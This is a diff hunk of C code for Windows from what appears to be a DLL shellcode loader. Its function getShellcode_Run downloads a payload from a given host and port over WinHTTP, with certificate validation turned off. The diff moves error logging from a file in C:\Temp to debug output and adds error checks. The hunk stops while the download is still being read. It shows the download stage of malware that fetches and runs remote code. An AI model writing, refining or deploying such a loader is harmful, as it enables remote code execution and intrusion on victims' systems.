@@ -329,65 +329,62 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     hSession = WinHttpOpen(L"Shellcode Loader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
-        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
-        if (fp) {
-            fprintf(fp, "WinHttpOpen failed with error: %ld\n", GetLastError());
-            fclose(fp);
-        }
+        char msg[256];
+        sprintf_s(msg, "WinHttpOpen failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
         goto cleanup;
     }
 
     hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
     if (!hConnect) {
-        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
-        if (fp) {
-            fprintf(fp, "WinHttpConnect failed with error: %ld\n", GetLastError());
-            fclose(fp);
-        }
+        char msg[256];
+        sprintf_s(msg, "WinHttpConnect failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
         goto cleanup;
     }
 
     hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     if (!hRequest) {
-        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
-        if (fp) {
-            fprintf(fp, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
-            fclose(fp);
-        }
+        char msg[256];
+        sprintf_s(msg, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
         goto cleanup;
     }
 
-    // Declare and initialize flags here, after hRequest is valid
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
     WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
-        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
-        if (fp) {
-            fprintf(fp, "WinHttpSendRequest failed with error: %ld\n", GetLastError());
-            fclose(fp);
-        }
+        char msg[256];
+        sprintf_s(msg, "WinHttpSendRequest failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
         goto cleanup;
     }
 
     bResults = WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) {
-        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
-        if (fp) {
-            fprintf(fp, "WinHttpReceiveResponse failed with error: %ld\n", GetLastError());
-            fclose(fp);
-        }
+        char msg[256];
+        sprintf_s(msg, "WinHttpReceiveResponse failed with error: %ld\n", GetLastError());
+        OutputDebugStringA(msg);
         goto cleanup;
     }
 
     do {
         dwSize = 0;
-        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+            char msg[256];
+            sprintf_s(msg, "WinHttpQueryDataAvailable failed with error: %ld\n", GetLastError());
+            OutputDebugStringA(msg);
+            break;
+        }
         if (dwSize == 0) break;
 
         pszOutBuffer = (LPSTR)malloc(dwSize + 1);
-        if (!pszOutBuffer) break;
+        if (!pszOutBuffer) {
+            OutputDebugStringA("Memory allocation failed\n");
+            break;
+        }
         ZeroMemory(pszOutBuffer, dwSize + 1);
 
         if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
